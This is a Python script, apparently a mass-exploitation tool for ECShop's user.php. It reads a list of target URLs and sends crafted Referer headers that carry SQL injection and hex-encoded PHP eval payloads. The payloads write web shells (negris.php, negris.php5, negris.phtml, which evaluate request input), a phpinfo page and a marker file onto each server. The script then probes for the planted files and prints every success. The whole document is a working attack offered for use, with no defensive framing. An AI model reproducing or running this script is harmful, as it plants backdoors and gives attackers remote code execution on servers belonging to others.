import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Desactivar las advertencias de InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

timeout = 8

#Mechanism 01
#file_put_contents en carpeta local -> archivo negris.php5 -> contenido eval-request.
headerv2 = {
    "User-Agent": 'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11',
    "Referer": '''554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:361:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b66696c655f7075745f636f6e74656e7473286261736536345f6465636f64652827626d566e636d6c7a4c6e426f6344553d27292c206261736536345f6465636f6465282750443977614841675a585a686243676b58314a4655565646553152624d5630704f79412f50673d3d2729293b7072696e745f72286572726f725f6765745f6c6173742829293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}554fcae493e564ee0dc75bdf2ebf94ca'''
}
headerv3 = {
    "User-Agent": 'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11',
    "Referer": '''45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:"num";s:361:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b66696c655f7075745f636f6e74656e7473286261736536345f6465636f64652827626d566e636d6c7a4c6e426f6344553d27292c206261736536345f6465636f6465282750443977614841675a585a686243676b58314a4655565646553152624d5630704f79412f50673d3d2729293b7072696e745f72286572726f725f6765745f6c6173742829293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}45ea207d7a2b68c49582d2d22adf953a'''
}
#End Mechanism 01
#Mechanism 02
#file_put_contents en carpeta local -> archivo negris.php -> contenido eval-request.
headerv2_1 = {
    "User-Agent": 'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11',
    "Referer": '''554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:361:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b66696c655f7075745f636f6e74656e7473286261736536345f6465636f64652827626d566e636d6c7a4c6e426f63413d3d27292c206261736536345f6465636f6465282750443977614841675a585a686243676b58314a4655565646553152624d5630704f79412f50673d3d2729293b7072696e745f72286572726f725f6765745f6c6173742829293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}554fcae493e564ee0dc75bdf2ebf94ca'''
}
headerv3_1 = {
    "User-Agent": 'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11',
    "Referer": '''45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:"num";s:361:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b66696c655f7075745f636f6e74656e7473286261736536345f6465636f64652827626d566e636d6c7a4c6e426f63413d3d27292c206261736536345f6465636f6465282750443977614841675a585a686243676b58314a4655565646553152624d5630704f79412f50673d3d2729293b7072696e745f72286572726f725f6765745f6c6173742829293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}45ea207d7a2b68c49582d2d22adf953a'''
}
#End Mechanism 02
#Mechanism 03
#file_put_contents en carpeta local -> archivo ru.php -> contenido phpinfo().
headerv2_2 = {
    "User-Agent": 'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11',
    "Referer": '''554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:321:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b66696c655f7075745f636f6e74656e7473286261736536345f6465636f64652827636e55756347687727292c206261736536345f6465636f646528275044397761484167634768776157356d627967704f79412f50673d3d2729293b7072696e745f72286572726f725f6765745f6c6173742829293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}554fcae493e564ee0dc75bdf2ebf94ca'''
}
headerv3_2 = {
    "User-Agent": 'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11',
    "Referer": '''45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:"num";s:321:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b66696c655f7075745f636f6e74656e7473286261736536345f6465636f64652827636e55756347687727292c206261736536345f6465636f646528275044397761484167634768776157356d627967704f79412f50673d3d2729293b7072696e745f72286572726f725f6765745f6c6173742829293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}45ea207d7a2b68c49582d2d22adf953a'''
}
#End Mechanism 03
#Mechanism 04
#file_put_contents en carpeta local -> archivo negris.phtml -> contenido eval-request().
headerv2_3 = {
    "User-Agent": 'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11',
    "Referer": '''554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:361:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b66696c655f7075745f636f6e74656e7473286261736536345f6465636f64652827626d566e636d6c7a4c6e426f6447317327292c206261736536345f6465636f6465282750443977614841675a585a686243676b58314a4655565646553152624d5630704f79412f50673d3d2729293b7072696e745f72286572726f725f6765745f6c6173742829293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}554fcae493e564ee0dc75bdf2ebf94ca'''
}
headerv3_3 = {
    "User-Agent": 'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11',
    "Referer": '''45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:"num";s:361:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b66696c655f7075745f636f6e74656e7473286261736536345f6465636f64652827626d566e636d6c7a4c6e426f6447317327292c206261736536345f6465636f6465282750443977614841675a585a686243676b58314a4655565646553152624d5630704f79412f50673d3d2729293b7072696e745f72286572726f725f6765745f6c6173742829293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}45ea207d7a2b68c49582d2d22adf953a'''
}
#End Mechanism 04
#Mechanism 05
#file_put_contents en carpeta local -> archivo ru.txt -> contenido mili.
headerv2_4 = {
    "User-Agent": 'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11',
    "Referer": '''554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:281:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b66696c655f7075745f636f6e74656e7473286261736536345f6465636f64652827636e55756448683027292c206261736536345f6465636f6465282762576c7361513d3d2729293b7072696e745f72286572726f725f6765745f6c6173742829293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}554fcae493e564ee0dc75bdf2ebf94ca'''
}
headerv3_4 = {
    "User-Agent": 'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11',
    "Referer": '''45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:"num";s:281:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b66696c655f7075745f636f6e74656e7473286261736536345f6465636f64652827636e55756448683027292c206261736536345f6465636f6465282762576c7361513d3d2729293b7072696e745f72286572726f725f6765745f6c6173742829293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}45ea207d7a2b68c49582d2d22adf953a'''
}
#End Mechanism 05

with open('urls.txt', 'r') as file:
    urls = file.readlines()

# Realizar las peticiones para cada URL con los headers correspondientes
for url in urls:
    url = url.strip()

    print('Attempt into: ', url)
    try:
        requests.get(url, headers=headerv2, timeout=timeout, verify=False)
        requests.get(url, headers=headerv3, timeout=timeout, verify=False)
        requests.get(url, headers=headerv2_1, timeout=timeout, verify=False)
        requests.get(url, headers=headerv3_1, timeout=timeout, verify=False)
        requests.get(url, headers=headerv2_2, timeout=timeout, verify=False)
        requests.get(url, headers=headerv3_2, timeout=timeout, verify=False)
        requests.get(url, headers=headerv2_3, timeout=timeout, verify=False)
        requests.get(url, headers=headerv3_3, timeout=timeout, verify=False)
        requests.get(url, headers=headerv2_4, timeout=timeout, verify=False)
        requests.get(url, headers=headerv3_4, timeout=timeout, verify=False)

        #check: file_put_contents en carpeta local -> archivo mili.php5 -> contenido ru.
        rst1 = requests.get(url.split('/user.php')[0]+'/negris.php5', timeout=timeout, verify=False)
        if rst1.status_code == 200:
            print('File:', url.split('/user.php')[0] + '/negris.php5')

        #check: file_put_contents en carpeta local -> archivo mili.php -> contenido ru.
        rst1 = requests.get(url.split('/user.php')[0]+'/negris.php', timeout=timeout, verify=False)
        if rst1.status_code == 200:
            print('File:', url.split('/user.php')[0] + '/negris.php')

        #check: file_put_contents en carpeta local -> archivo ru.php -> contenido phpinfo().
        rst1 = requests.get(url.split('/user.php')[0]+'/ru.php', timeout=timeout, verify=False)
        if rst1.status_code == 200:
            print('File:', url.split('/user.php')[0] + '/ru.php')

        #check: file_put_contents en carpeta local -> archivo ru.php -> contenido phpinfo().
        rst1 = requests.get(url.split('/user.php')[0]+'/negris.phtml', timeout=timeout, verify=False)
        if rst1.status_code == 200:
            print('File:', url.split('/user.php')[0] + '/negris.phtml')

        #check: file_put_contents en carpeta local -> archivo ru.php -> contenido phpinfo().
        rst1 = requests.get(url.split('/user.php')[0]+'/ru.txt', timeout=timeout, verify=False)
        if rst1.status_code == 200:
            print('File:', url.split('/user.php')[0] + '/ru.txt')
    except Exception as e:
        print('Timeout occurred for URL:', url)
        continue